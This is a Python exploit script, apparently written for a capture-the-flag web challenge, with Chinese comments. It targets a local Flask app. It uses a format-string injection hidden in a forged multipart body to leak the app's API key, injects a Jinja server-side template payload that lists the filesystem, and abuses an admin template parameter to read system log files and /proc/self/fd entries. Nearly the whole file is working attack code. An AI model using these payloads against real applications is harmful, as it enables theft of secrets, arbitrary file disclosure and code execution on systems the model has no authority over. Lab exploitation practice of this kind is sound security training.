import httpx
import time

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=30.0)
        return r.text, r.status_code
    except Exception as e:
        return str(e), 0

def inject_ssti_via_log():
    """尝试通过日志注入 SSTI"""
    # SSTI payload 来列目录
    ssti_payload = "{{lipsum.__globals__['os'].listdir('/')}}"
    
    # 发送包含 SSTI payload 的请求
    # 尝试注入到各种日志
    params = {
        'text': 'test',
        'client': 'User-Agent',
        'token': ssti_payload
    }
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 注入 SSTI payload
    print("\n[*] Injecting SSTI payload via User-Agent...")
    result = inject_ssti_via_log()
    print(f"Response: {result}")
    
    # 检查可能的日志文件
    log_paths = [
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/messages",
        "/var/log/syslog",
        "/var/log/flask/app.log",
        "/tmp/flask.log",
        "/app/app.log",
    ]
    
    print("\n[*] Checking log files...")
    for log in log_paths:
        content, code = read_file_via_admin(api_key, log)
        if code == 200:
            print(f"[+] Found log: {log}")
            print(f"Content: {content[:500]}")
    
    # 关键：检查 /proc/self/fd 是否有日志文件
    print("\n[*] Checking /proc/self/fd for logs...")
    for i in range(30):
        content, code = read_file_via_admin(api_key, f"/proc/self/fd/{i}")
        if code == 200 and content and len(content) > 0:
            print(f"fd/{i}: {content[:100]}...")
